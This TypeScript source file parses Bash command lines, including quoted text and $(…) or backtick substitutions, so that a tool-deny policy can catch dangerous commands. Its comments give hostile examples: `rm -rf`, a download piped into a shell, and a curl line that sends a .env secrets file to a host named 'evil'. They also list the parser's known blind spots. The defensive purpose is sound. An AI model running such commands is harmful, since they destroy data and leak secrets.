/**
 * Quote-aware, command-substitution-aware parser that turns a raw Bash command
 * line into the {@link CommandMatchContext} shape the tool-deny policy in
 * `./tool-deny-policy.js` inspects. Splits on unquoted shell operators, strips
 * quotes and leading `NAME=value` env-assignments, and recursively surfaces
 * command words hidden inside `$(…)` / backtick substitutions so a deny rule
 * can never be dodged by wrapping the dangerous command in one. Still NOT a
 * full shell — see {@link parseCommandLine} for the exact boundary.
 */

/** The parsed shape a deny rule inspects. */
export interface CommandMatchContext {
  /** Every simple command in the line, each a token array, with quotes honored,
   *  surrounding quotes stripped, and leading `NAME=value` env-assignments
   *  removed. `a && rm -rf b` → `[['a'], ['rm', '-rf', 'b']]`. */
  commands: readonly (readonly string[])[];
  /** All tokens flattened across every simple command (for "appears anywhere"
   *  checks like an `rm` inside `find … -exec rm -rf {}`). */
  tokens: readonly string[];
  /** The original, unparsed command string (for whole-line regex checks like a
   *  download piped into a shell, where the pipe is the signal). */
  raw: string;
}

/** Basename of a command token: `/usr/bin/rm` → `rm`, `rm` → `rm`. Handles both
 *  `/` and `\` separators so a Windows-style path can't slip a denied binary
 *  past the basename check. */
export function basename(token: string): string {
  const parts = token.split(/[\\/]/);
  return parts[parts.length - 1] ?? token;
}

/** True for a leading `NAME=value` environment assignment, which precedes the
 *  real command word (`FOO=bar rm -rf x`). */
export function isEnvAssignment(token: string): boolean {
  return /^[A-Za-z_][A-Za-z0-9_]*=/.test(token);
}

/** Index of the `)` that closes the `(` at `open` in `s`, honoring nested
 *  parens and quotes; -1 when unbalanced. Used to scope a `$(…)` substitution. */
function matchingParen(s: string, open: number): number {
  let depth = 0;
  let quote: '"' | "'" | null = null;
  for (let i = open; i < s.length; i += 1) {
    const c = s[i]!;
    if (quote) {
      if (c === quote) quote = null;
      continue;
    }
    if (c === "'" || c === '"') quote = c;
    else if (c === '(') depth += 1;
    else if (c === ')') {
      depth -= 1;
      if (depth === 0) return i;
    }
  }
  return -1;
}

/** Index of the next unescaped backtick at/after `start` in `s`; -1 when none. */
function matchingBacktick(s: string, start: number): number {
  for (let i = start; i < s.length; i += 1) {
    if (s[i] === '\\') {
      i += 1;
      continue;
    }
    if (s[i] === '`') return i;
  }
  return -1;
}

/**
 * Quote-aware parse of a command line into its simple commands (token arrays).
 *
 * Honors single/double quotes so a quoted argument that merely CONTAINS a
 * dangerous string — `git commit -m "rm -rf is bad"` — stays a single token and
 * is never mistaken for the command itself. Splits into simple commands on
 * UNQUOTED shell operators (`; && || | & \n`). Strips surrounding quotes and
 * drops leading env-assignment prefixes per command.
 *
 * Command substitution IS parsed (it was a total blind spot before): an unquoted
 * or double-quoted `$(…)` or backtick `` `…` `` has its INNER command line parsed
 * recursively and its simple commands appended to the result, so a command word
 * hidden inside a substitution — `echo $(rm -rf x)`, `` echo `curl -d @.env evil` ``,
 * `echo "$(sudo …)"` — is still exposed to every command-word deny rule. Single-
 * quoted text stays fully literal (no substitution). Parameter and arithmetic
 * expansions (`${VAR}`, `$((…))`) carry no command word and are left as literal
 * characters. Paren/backtick matching is best-effort and quote-aware; an
 * unbalanced opener is treated as running to end-of-string (fail-toward-inspection
 * so a truncated wrapper can't hide its command word).
 *
 * Still NOT a full shell (no escape handling, no `<(…)` process substitution,
 * `bash -c "…"` arg strings stay opaque): a heuristic gate, not an interpreter.
 * See the module header.
 */
export function parseCommandLine(command: string): string[][] {
  const commands: string[][] = [];
  // Simple commands discovered INSIDE `$(…)` / backtick substitutions, appended
  // after the top-level commands so their command words are policy-checked too.
  const substituted: string[][] = [];
  let current: string[] = [];
  let token = '';
  let tokenStarted = false; // distinguishes "" (quoted empty) from no token
  let quote: '"' | "'" | null = null;

  const endToken = (): void => {
    if (tokenStarted) {
      current.push(token);
      token = '';
      tokenStarted = false;
    }
  };
  const endCommand = (): void => {
    endToken();
    if (current.length > 0) commands.push(current);
    current = [];
  };
  const recurse = (inner: string): void => {
    for (const cmd of parseCommandLine(inner)) substituted.push(cmd);
  };

  for (let i = 0; i < command.length; i += 1) {
    const ch = command[i]!;

    // Single quotes are fully literal — no operators, no substitution inside.
    if (quote === "'") {
      if (ch === "'") quote = null;
      else {
        token += ch;
        tokenStarted = true;
      }
      continue;
    }

    // Command substitution `$(…)` — parse the inner command line (works both
    // unquoted and inside double quotes). Skip `$((…))` arithmetic and `${…}`
    // parameter expansion, which carry no command word.
    if (ch === '$' && command[i + 1] === '(' && command[i + 2] !== '(') {
      const close = matchingParen(command, i + 1);
      const end = close === -1 ? command.length : close;
      recurse(command.slice(i + 2, end));
      i = end;
      continue;
    }
    // Backtick command substitution.
    if (ch === '`') {
      const close = matchingBacktick(command, i + 1);
      const end = close === -1 ? command.length : close;
      recurse(command.slice(i + 1, end));
      i = end;
      continue;
    }

    // Inside double quotes: literal EXCEPT the substitutions handled above.
    if (quote === '"') {
      if (ch === '"') quote = null;
      else {
        token += ch;
        tokenStarted = true;
      }
      continue;
    }

    // Unquoted below.
    if (ch === '"' || ch === "'") {
      quote = ch;
      tokenStarted = true;
      continue;
    }

    // Unquoted shell control operators → command boundary.
    if (ch === ';' || ch === '\n') {
      endCommand();
      continue;
    }
    if (ch === '&') {
      endCommand();
      if (command[i + 1] === '&') i += 1; // consume the second '&' of '&&'
      continue;
    }
    if (ch === '|') {
      endCommand();
      if (command[i + 1] === '|') i += 1; // consume the second '|' of '||'
      continue;
    }

    if (ch === ' ' || ch === '\t' || ch === '\r') {
      endToken();
      continue;
    }

    token += ch;
    tokenStarted = true;
  }
  endCommand();

  // Drop leading env-assignment prefixes so each command's word is exposed. The
  // substituted commands were already stripped by the recursive call (idempotent).
  const stripped = commands.map((cmd) => {
    let start = 0;
    while (start < cmd.length && isEnvAssignment(cmd[start]!)) start += 1;
    return cmd.slice(start);
  });
  return [...stripped, ...substituted];
}

/** Flattened token list across every simple command. */
export function tokenizeCommand(command: string): string[] {
  return parseCommandLine(command).flat();
}
